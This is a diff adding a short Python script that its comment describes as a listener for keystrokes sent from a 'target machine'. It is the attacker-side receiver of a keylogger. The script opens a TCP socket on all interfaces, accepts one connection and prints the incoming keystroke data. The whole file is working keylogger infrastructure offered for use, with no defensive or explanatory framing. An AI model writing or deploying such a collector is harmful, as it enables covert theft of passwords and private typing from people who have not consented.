@@ -1,0 +1,23 @@
+# Run below pyhton script to listen the key stock from taget machine 
+
+import socket
+
+# Start socket 
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.bind(('0.0.0.0', receiver_port))  # Change receiver_port
+server_socket.listen(1)
+
+print("Waiting for connection...")
+client_socket, client_address = server_socket.accept()
+print("Connected.")
+
+# Receive and print the keys
+try:
+    while True:
+        data = client_socket.recv(1024)
+        if not data:
+            break
+        print(data.decode(), end='', flush=True)  # Print without newline
+except KeyboardInterrupt:
+    client_socket.close()
+    server_socket.close()
